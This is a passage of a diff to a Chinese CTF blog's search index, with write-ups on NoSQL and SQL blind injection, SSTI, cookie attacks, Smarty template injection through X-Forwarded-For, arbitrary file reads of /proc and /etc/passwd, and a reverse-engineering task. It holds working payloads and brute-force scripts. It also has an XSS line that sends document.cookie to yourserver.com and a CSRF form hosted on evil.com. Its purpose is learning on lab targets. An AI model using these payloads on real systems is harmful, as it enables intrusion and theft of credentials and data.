@@ -1,266 +1,212 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>NoSQL</title>
-    <url>/posts/f0940727/</url>
-    <content><![CDATA[<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><h3 id="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"><a href="#意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下" class="headerlink" title="意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下"></a>意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下</h3><h4 id="什么是NoSQL？"><a href="#什么是NoSQL？" class="headerlink" title="什么是NoSQL？"></a>什么是NoSQL？</h4><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
-<p>大多数遇到的NoSQL注入，其采用的数据库都是MongoDB。</p>
-<blockquote>
-<p><a href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRWEDBn=QIIDRORYTD#toc-12">读这里详细了解MongoDB</a></p>
-</blockquote>
-<h4 id="NoSQL-注入的分类"><a href="#NoSQL-注入的分类" class="headerlink" title="NoSQL 注入的分类"></a>NoSQL 注入的分类</h4><h5 id="有两种-NoSQL-注入分类的方式："><a href="#有两种-NoSQL-注入分类的方式：" class="headerlink" title="有两种 NoSQL 注入分类的方式："></a>有两种 NoSQL 注入分类的方式：</h5><p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
-<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
-<pre><code>重言式注入
-</code></pre>
-<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
-<pre><code>联合查询注入
-</code></pre>
-<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
-<pre><code>JavaScript 注入
-</code></pre>
-<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
-<pre><code>盲注
-</code></pre>
-<p>当页面没有回显时，那么我们可以通过 $regex 正则表达式来达到和传统 SQL 注入中 substr() 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
-<p>常见的NoSQL为PHP中的NoSQL和Node.js中的NoSQL  </p>
-<h5 id="PHP-中的NoSQL注入"><a href="#PHP-中的NoSQL注入" class="headerlink" title="PHP 中的NoSQL注入"></a>PHP 中的NoSQL注入</h5><p>重言式注入：</p>
-<p>重言式注入通常也是判断是否为NoSQL的第一步。<br>我们需要用$ne关键字构造永真条件来完成NoSQL注入</p>
-<pre><code>username[$ne]=1&amp;password[$ne]=1
-</code></pre>
-<p>最后如果数据库没有进行任何过滤的话，这里就会输出所有的用户名和用户密码<br>这里的原理是，$ne关键字在MongoDB查询语句中意思是不等于，也就是说我们上传了一个永真条件，使得登陆成功，但是服务端查不到username是1，password也是1的账户，只能输出所有的账户</p>
-<p>所以我们也可以使用以下的payload：</p>
-<pre><code>username[$ne]=&amp;password[$ne]=
-username[$gt]=&amp;password[$gt]=
-username[$gte]=&amp;password[$gte]=
-</code></pre>
-<p>JavaScript注入：</p>
-<p>MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
-<p>要想使用JS注入，我们需要了解一下$where操作符。</p>
-<p>在MongoDB中，可以通过$where操作符直接执行JavaScript代码如下实例：</p>
-<blockquote>
-<p>db.users.find({ $where: “function(){return(this.username &#x3D;&#x3D; ‘whoami’)}” })<br>{ “_id” : ObjectId(“60fa9c80257f18542b68c4b9”), “username” : “whoami”, “password” : “657260” }</p>
-</blockquote>
-<p>由于使用了 $where 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
-<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 $userData 获取查询条件：</p>
-<pre><code>db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)
-</code></pre>
-<p>然后，攻击者可能会注入一种恶意的字符串如 ‘a’; sleep(5000) ，此时 MongoDB 执行的查询语句为：</p>
-<pre><code>db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#39;a&#39;; sleep(5000))&#125;&quot; &#125;)
-</code></pre>
-<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。<br>值得注意的是，在 MongoDB 2.4 之前，通过 $where 操作符使用<em>map-reduce</em>、<em>group</em> 命令可以访问到 Mongo Shell 中的全局函数和属性，如<em>db</em>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。<br>在MongoDB 2.4 之后<em>db</em>访问不到了，但还是可以构造万能密码查出用户信息</p>
-<p>布尔盲注：<br>当页面没有回显的时候可以使用$regex正则表达式来进行盲注，$regex可以达到和传统SQL注入中substr()函数相同的功能。</p>
-<p>和传统SQL注入一样，在已知用户名的情况下，我们需要知道密码长度。可以使用</p>
-<blockquote>
-<p>username&#x3D;admin&amp;password[$regex]&#x3D;.[4] (“[]”中的数字可以更改来确定密码长度，如果[4]为真，[5]为假，则密码为4位)  </p>
-</blockquote>
-<h5 id="Node-js中的MongoDB注入"><a href="#Node-js中的MongoDB注入" class="headerlink" title="Node.js中的MongoDB注入"></a>Node.js中的MongoDB注入</h5><p>Node.js中的MongoDB注入主要是重言式注入，通过构造永真式万能密码实现登录绕过<br>另外，如果过滤了$ne关键字可以使用Unicode编码绕过。<br>在这里贴一个布尔盲注用于爆密码的脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:27409/login.php&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line"></span><br><span class="line">            # When the method is GET</span><br><span class="line">            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)</span><br><span class="line">            # When the method is POST</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            # When the method is POST with JSON</span><br><span class="line">            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)</span><br><span class="line">            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line">            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span><br><span class="line"></span><br><span class="line">            #r = requests.post(url=url, data=post_payload)</span><br><span class="line">            if &#x27;但没完全登录&#x27; in r.content.decode():</span><br><span class="line">                print(&quot;[+] %s&quot; % (password + c))</span><br><span class="line">                password += c</span><br><span class="line"></span><br><span class="line"># 输出:</span><br><span class="line"># [+] 4</span><br><span class="line"># [+] 42</span><br><span class="line"># [+] 422</span><br><span class="line"># [+] 4227</span><br><span class="line"># [+] 42276</span><br><span class="line"># [+] 422766</span><br><span class="line"># ......</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a1</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a13</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a130</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a1307</span><br><span class="line"># [+] 42276606202db06ad1f29ab6b4a1307f</span><br></pre></td></tr></table></figure>
-<h1 id="关于Linux中的管道符"><a href="#关于Linux中的管道符" class="headerlink" title="关于Linux中的管道符 |"></a>关于Linux中的管道符 |</h1><p>管道符在以前RCE的时候也见到过但是没有进行系统研究，最近刷题的时候又遇到了，所以在这里记录一下<br>使用|可以将两个命令分隔开来，同时管道符左边命令的输出可以作右边命令的输入<br>因此在遇到一些已经可以执行命令（比如Ping）的靶机上，通过|连接cat或find或grep命令来找到flag</p>
-<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>MD5绕过真是五花八门，ffifdyop和129581926211651571912466741651878684928可用于SQL注入时语句经过MD5加密之后的绕过，其原理是：提交的字符串经过加密形成的16进制字符串转换成10进制数字后对应的asii表内容为：‘ or ‘ 6……。<br>另外，数组绕过还可以绕过<em>if($_POST[‘param1’]!&#x3D;&#x3D;$_POST[‘param2’]&amp;&amp;md5($_POST[‘param1’])&#x3D;&#x3D;&#x3D;md5($_POST[‘param2’]))</em></p>
-<h1 id="SQL布尔盲注"><a href="#SQL布尔盲注" class="headerlink" title="SQL布尔盲注"></a>SQL布尔盲注</h1><p>第一次在题目中遇到布尔盲注，所以在这里记录一下<br>题目：</p>
-<blockquote>
-<p><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World">[CISCN2019 华北赛区 Day2 Web1]Hack World<br>1</a> </p>
-</blockquote>
-<p>我一开始怀疑是NoSQL（因为题目提示是SQL注入，PHP），结果尝试username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1发现已经被过滤了。遂尝试普通的SQL注入<br>输入*1’ or 1&#x3D;1 –+<em>和</em>1;show databases();#*发现均被过滤，而输入1和2的时候登陆成功，输入3以上的数字以及字母都会报错（回显bool flase）<br>所以猜测这里需要布尔盲注，同时屏蔽了关键词<br>尝试Fuzz一下看看屏蔽了哪些关键词</p>
-<pre><code>这里粘贴一些用于Fuzz的字典
-https://github.com/Underwood12/FuzzDict
-这是Fuzz教程  
-https://www.bilibili.com/video/BV1Zs42137tf
-</code></pre>
-<p>题目给库名和表名都是flag<br>所以用<em>id&#x3D;0^(ascii(substr((select(flag)from(flag)),1,1))&gt;101)</em><br>来查询，由于当&gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f<br>然后使用脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">num = 0  # 用了来判断是不是flag已经拼完整了</span><br><span class="line">for i in range(1, 60):</span><br><span class="line"></span><br><span class="line">    if num == 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    for j in range(32, 128):</span><br><span class="line"></span><br><span class="line">        payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j)</span><br><span class="line">        # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line"></span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            x = chr(j)</span><br><span class="line">            result += str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if &quot;&#125;&quot; in result:</span><br><span class="line">            print(result)</span><br><span class="line">            num = 1</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+    <title>DASCTF2024十月赛</title>
+    <url>/posts/d9660052/</url>
+    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><p>创建实例，提示：</p>
+<pre><code>Welcome to My Flask App
 
+This is a simple web app using Flask.  
+</code></pre>
+<p>给出了任意文件读功能  </p>
+<p>看看 flask 应用的目录结构：  </p>
+<pre><code>my_flask_app/
+│
+├── app/
+│   ├── __init__.py
+│   ├── routes/
+│   │   ├── __init__.py
+│   │   ├── main.py
+│   │   └── auth.py
+│   ├── models/
+│   │   ├── __init__.py
+│   │   └── user.py
+│   ├── templates/
+│   │   ├── layout.html
+│   │   └── home.html
+│   └── static/
+│       ├── css/
+│       └── js/
+│
+├── config.py
+├── requirements.txt
+├── migrations/
+│   └── ...
+└── run.py  
+</code></pre>
+<p>所以源码应该在 &#x2F;app&#x2F;main.py 中</p>
+<p>读源码：  </p>
+<pre><code>from flask import Flask, request, render_template_string, abort
+
+app = Flask(__name__)
+
+HOME_PAGE_HTML = &#39;&#39;&#39;
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+    &lt;title&gt;Flask Web Application&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;h1 class=&quot;display-4 text-center&quot;&gt;Welcome to My Flask App&lt;/h1&gt;
+    &lt;p class=&quot;lead text-center&quot;&gt;This is a simple web app using Flask.&lt;/p&gt;
+    &lt;div class=&quot;text-center&quot;&gt;
+        &lt;a href=&quot;/file?f=example.txt&quot; class=&quot;btn btn-primary&quot;&gt;Read example.txt&lt;/a&gt;
+    &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&#39;&#39;&#39;
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template_string(HOME_PAGE_HTML)
+
+@app.route(&#39;/file&#39;)
+def file():
+    file_name = request.args.get(&#39;f&#39;)
+
+    if not file_name:
+        return &quot;Error: No file parameter provided.&quot;, 400
+
+    try:
+        with open(file_name, &#39;r&#39;) as file:
+            content = file.read()
+        return content
+    except FileNotFoundError:
+        return abort(404, description=&quot;File not found.&quot;)
+    except Exception as e:
+        return f&quot;Error reading file.&quot;, 500
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&quot;127.0.0.1&quot;, port=8080)  
+</code></pre>
+<p>尝试读环境变量，查资料得知，Linux 系统存在如下敏感路径（在存在获取任意文件读时）</p>
+<pre><code>/etc/passwd
+</code></pre>
+<p>该文件储存了该 Linux 系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 Shell （以冒号作为分隔符）</p>
+<pre><code>/proc/self
+</code></pre>
+<p>proc 是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过 &#x2F;proc&#x2F;PID 可以访问对应 PID 的进程内核数据，而 &#x2F;proc&#x2F;self  访问的是当前进程的内核数据。</p>
+<pre><code>/proc/self/cmdline
+</code></pre>
+<p>该文件包含的内容为当前进程执行的命令行参数。</p>
+<pre><code>/proc/self/mem
+</code></pre>
+<p>&#x2F;proc&#x2F;self&#x2F;mem 是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合 &#x2F;proc&#x2F;self&#x2F;maps 中的偏移地址进行读取。通过参数 start 和 end 及偏移地址值读取内容。</p>
+<pre><code>/proc/self/maps
+</code></pre>
+<p>&#x2F;proc&#x2F;self&#x2F;maps 包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</p>
+<pre><code>flask-session结构
+</code></pre>
+<p> flask_session 是 flask 框架实现 session 功能的一个插件。其 session 结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session 默认 session 的储存是在用户 Cookie 中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。  </p>
+<p>查阅资料，得知 environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看 environ 目录来获取指定进程的环境变量信息  </p>
+<p>因此<code>/file?f=/proc/1/environ</code>读到flag  </p>
+<p>参考：</p>
+<blockquote>
+<p><a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.cnblogs.com/niyani/p/17074125.html">攻防世界-cat_cat_new（flask_session伪造、&#x2F;proc&#x2F;self&#x2F;文件夹）</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.runoob.com/flask/flask-layout.html">Flask 项目结构</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/15986?time__1311=GqjxcD2DnDRWDsD7zY0=GOQGCYy2Dw74rD">DASCTF 2024 十月挑战赛</a>  </p>
+</blockquote>
+<p>DASCTF十月赛其他题太过于抽象了 ~ <del>&gt;_&lt;</del> ~</p>
+<h2 id="CISCN2019-华东南赛区-Web11-1"><a href="#CISCN2019-华东南赛区-Web11-1" class="headerlink" title="[CISCN2019 华东南赛区] Web11 1"></a>[CISCN2019 华东南赛区] Web11 1</h2><p>刚刚进入实例,一时不知所措  </p>
+<p>后面看到XFF </p>
+<p>使用BP抓包,没发现什么特别的  </p>
+<p>在页面底部发现一行字：Build With Smarty !  </p>
+<p>查阅资料得知,   Smarty 是 PHP 的模板引擎，有助于将表示 (HTML&#x2F;CSS) 与应用程序逻辑分离。在 3.1.42 和 4.0.2 版本之前，模板作者可以通过制作恶意数学字符串来运行任意 PHP 代码。如果数学字符串作为用户提供的数据传递给数学函数，则外部用户可以通过制作恶意数学字符串来运行任意 PHP 代码。用户应升级到版本 3.1.42 或 4.0.2 以接收补丁。  </p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/11085?time__1311=Cq0x2Qi=omqYqGNDQie7IK0IbbbmOa4D">CVE-2021-29454——Smarty模板注入</a>  </p>
+</blockquote>
+<p>所以我们可以尝试注入如下代码:</p>
+<pre><code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;
+</code></pre>
+<p>但传递这个Payload需要注入点,这里只有XFF可以入手  </p>
+<p>BP这样写:  </p>
+<pre><code>GET / HTTP/1.1
+Host: node5.buuoj.cn:25829
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Sec-GPC: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+X-Forwarded-For: string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;
+Content-Length: 2
+</code></pre>
+<p>发送两次,发现读到环境变量,代码执行成功  </p>
+<p>然后XFF传递<code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;ls /&#39;));&quot;,$s)&#125;</code>  </p>
+<pre><code>bin
+dev
+etc
+flag
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+usr
+var
+</code></pre>
+<p>读到存在flag目录,直接 cat &#x2F;flag  </p>
+<p>XFF payload: <code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;cat /flag&#39;));&quot;,$s)&#125;</code>  </p>
 <p>得到flag  </p>
-<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下<br>题目在这：</p>
-<blockquote>
-<p>👉 <a href="https://buuoj.cn/challenges#[BJDCTF2020]Cookie%20is%20so%20stable">BJDCTF2020 题目链接</a></p>
-</blockquote>
-<h2 id="1-SSTI"><a href="#1-SSTI" class="headerlink" title="1.SSTI"></a>1.SSTI</h2><p>SSTI是这道题所考察的知识点，所以写在最前面  </p>
-<h3 id="如何判断是SSTI"><a href="#如何判断是SSTI" class="headerlink" title="如何判断是SSTI"></a>如何判断是SSTI</h3><p>众所周知，SSTI是利用服务器模板漏洞，在模板引擎中注入恶意代码来进行攻击。<br>所以我们可以通过输入一些特殊的“探针”，观察服务器响应的变化来判断是否存在SSTI<br>常见的SSTI探针：</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>IDA打开  </p>
+<p>main函数中似乎没有什么有用的东西  </p>
+<p>点击菜单栏的“View”（视图）&gt;“Open subviews”（打开子视图）&gt;“Strings”（字符串）打开字符串窗口  </p>
+<p>发现<code>BJD&#123;%d%d2069a45792d233ac&#125;</code>,跟进看看</p>
+<pre><code>INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)
+&#123;
+CHAR String[100]; // [esp+0h] [ebp-64h] BYREF
 
-    {{7*7}}               # Jinja2, Nunjucks, Twig等
-    ${7*7}                # JSP, Freemarker, Spring
-    <%= 7 * 7 %>          # EJS (Embedded JavaScript)
-    #{7*7}                # Thymeleaf
-
-<p>我们可以在输入框、URL参数、HTTP头、Cookies等位置尝试输入这些探针。然后查看页面返回里有没有49，如果有49，说明这里执行成功了，则存在SSTI漏洞  </p>
-<p>不同的模板中使用不同的注入格式</p>
-<ul>
-<li><strong>Jinja2 和 Twig</strong>: 使用 <code>&#123;&#123; &#125;&#125;</code></li>
-<li><strong>Freemarker 和 Spring</strong>: 使用 <code>$&#123; &#125;</code></li>
-<li><strong>EJS</strong>: 使用 <code>&lt;%= %&gt;</code></li>
-<li><strong>Thymeleaf</strong>: 使用 <code>#&#123; &#125;</code><br>有时候会对大括号之类的进行过滤，所以可以用Unicode进行绕过</li>
-</ul>
-<blockquote>
-<p>👉 <a href="https://forum.butian.net/share/1371">SSTI 利用的文章</a></p>
-</blockquote>
-<h2 id="2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"><a href="#2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？" class="headerlink" title="2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"></a>2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？</h2><p>Cookie可以从以下方面入手<br>1.HttpOnly、Secure、SameSite 标志：如果Cookie没有设置这些标志，可能可以通过XSS攻击窃取Cookie。<br>2.弱JWT签名：如果JWT使用弱的对称加密密钥（如 secret）或无签名 (none algorithm)，可以直接伪造JWT。<br>3.客户端验证：CTF中常见的“role&#x3D;guest”→“role&#x3D;admin”权限提升。<br>4.会话固定 (Session Fixation)：如果你能控制Session ID，可能可以冒充管理员。  </p>
-<p>这里详细写一下第一点和第二点  </p>
-<p>一、HttpOnly、Secure、SameSite 标志<br>我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：</p>
-<pre><code>HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
-Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。
-SameSite：如果为None，可能可用于CSRF攻击。  
+if ( a2 != 272 )
+&#123;
+    if ( a2 != 273 )
+    return 0;
+    if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 )
+    &#123;
+    sprintf(String, Format, ++dword_4099F0);
+    if ( dword_4099F0 == 19999 )
+    &#123;
+        sprintf(String, &quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;, 19999, 0);
+        SetWindowTextA(hWnd, String);
+        return 0;
+    &#125;
+    SetWindowTextA(hWnd, String);
+    return 0;
+    &#125;
+    EndDialog(hWnd, (unsigned __int16)a3);
+&#125;
+return 1;
+&#125;  
 </code></pre>
-<h4 id="1-利用-HttpOnly"><a href="#1-利用-HttpOnly" class="headerlink" title="1. 利用 HttpOnly"></a>1. 利用 HttpOnly</h4><p>开启HttpOnly则禁止通过JavaScript访问Cookie  如果这里是关的，那就可以  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;http://yourserver.com/steal?cookie=&#x27; + document.cookie);&lt;/script&gt;    </span><br></pre></td></tr></table></figure>
-<p>通过钓鱼的方式来获取管理员的会话ID  </p>
-<h4 id="2-利用未设置-Secure-的-Cookie"><a href="#2-利用未设置-Secure-的-Cookie" class="headerlink" title="2. 利用未设置 Secure 的 Cookie"></a>2. 利用未设置 Secure 的 Cookie</h4><p>使用Burp Suite或Wireshark进行抓包。<br>在HTTP请求中，寻找Cookie: PHPSESSID&#x3D;xxxx。<br>如果会话ID出现在HTTP请求中，而不是HTTPS中，则可以劫持会话。<br>如果题目考察是中间人攻击 (MITM)，你可以使用Wireshark来捕获Cookie：<br>过滤器：http.cookie。<br>查找“Set-Cookie”或“Cookie”字段中的会话ID。 </p>
-<h4 id="3-利用不安全的-SameSite-属性"><a href="#3-利用不安全的-SameSite-属性" class="headerlink" title="3. 利用不安全的 SameSite 属性"></a>3. 利用不安全的 SameSite 属性</h4><p>如果SameSite标志为None，则跨站请求可以携带会话ID。<br>这使得CSRF攻击成为可能。<br>在攻击者的网站（比如 http:&#x2F; &#x2F;evil.com）上放置以下表单：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;http ://victim.com/change_password.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;newpassword123&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
-<p>如果SameSite&#x3D;None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。</p>
-]]></content>
-      <tags>
-        <tag>周报</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE，XSS</title>
-    <url>/posts/4d9b8a15/</url>
-    <content><![CDATA[<h1 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h1><h2 id="记录一道关于PHP函数漏洞利用的题目"><a href="#记录一道关于PHP函数漏洞利用的题目" class="headerlink" title="记录一道关于PHP函数漏洞利用的题目"></a>记录一道关于PHP函数漏洞利用的题目</h2><blockquote>
-<p><a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目在这里</a>  </p>
-</blockquote>
-<p>创建实例显示源代码如下：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>进行代码审计，我们发现</p>
-<p>只要传入host参数，就会进入else逻辑,其中存在mkdir命令和chdir命令。</p>
-<pre><code>mkdir命令是确保sandbox存在，不存在就创建一个
